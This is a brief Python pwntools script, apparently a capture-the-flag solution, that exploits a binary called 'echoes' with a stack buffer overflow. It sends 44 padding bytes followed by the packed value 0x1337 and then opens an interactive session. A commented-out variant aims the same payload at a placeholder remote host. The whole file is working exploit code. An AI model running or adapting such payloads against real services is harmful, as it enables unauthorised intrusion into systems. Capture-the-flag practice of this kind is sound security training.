from pwn import *

context.binary = elf = ELF("../handout/echoes", checksec=False)

# Local:
p = process(elf.path)

payload = b"A" * 44 + p32(0x1337)
p.sendlineafter(b"> ", payload)

p.interactive()

# Remote:
# p = remote("HOST", PORT)
# p.sendlineafter(b"> ", payload)
# p.interactive()
